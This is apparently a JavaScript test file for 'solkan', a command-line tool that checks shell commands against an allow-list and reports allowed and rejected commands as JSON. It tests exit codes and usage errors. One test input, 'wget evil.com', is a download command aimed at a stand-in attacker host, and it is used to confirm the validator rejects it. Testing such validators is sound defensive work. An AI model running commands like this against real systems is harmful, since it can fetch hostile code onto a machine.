import { run } from 'firost';

describe('solkan CLI', () => {
  /**
   * Executes the solkan CLI command with the provided arguments and returns the result
   * @param {string} args - Command line arguments to pass to the solkan CLI
   * @returns {Promise<{stdout: string, stderr: string, exitCode: number}>} Object containing stdout, stderr, and exit code from the CLI execution
   */
  async function runCli(args) {
    try {
      const result = await run(`node ./bin/solkan ${args}`, {
        shell: true,
        stdout: false,
      });
      return { stdout: result.stdout, stderr: result.stderr, exitCode: 0 };
    } catch (err) {
      const exitCode = parseInt(
        err.code.replace('FIROST_RUN_EXIT_CODE_', ''),
        10,
      );
      return { stdout: err.stdout, stderr: err.stderr, exitCode };
    }
  }

  describe('JSON output', () => {
    it.each([
      {
        title: 'allowed command exits 0 with JSON',
        args: "--allow-list echo 'echo hello'",
        expectedExitCode: 0,
        expectedJson: {
          isAllowed: true,
          commands: { allowed: ['echo'], rejected: [] },
        },
      },
      {
        title: 'rejected command exits 1 with JSON',
        args: "--allow-list echo 'wget evil.com'",
        expectedExitCode: 1,
        expectedJson: {
          isAllowed: false,
          commands: { allowed: [], rejected: ['wget'] },
        },
      },
    ])('$title', async ({ args, expectedExitCode, expectedJson }) => {
      const { stdout, exitCode } = await runCli(args);
      expect(exitCode).toBe(expectedExitCode);
      expect(JSON.parse(stdout)).toEqual(expectedJson);
    });
  });

  describe('usage error', () => {
    it.each([
      {
        title: 'missing --allow-list exits 2 with stderr and no JSON',
        args: "'echo hello'",
      },
      {
        title: 'missing command arg exits 2 with stderr and no JSON',
        args: '--allow-list echo',
      },
    ])('$title', async ({ args }) => {
      const { stdout, stderr, exitCode } = await runCli(args);
      expect(exitCode).toBe(2);
      expect(stdout).toBe('');
      expect(stderr).toContain('Usage:');
    });
  });
});
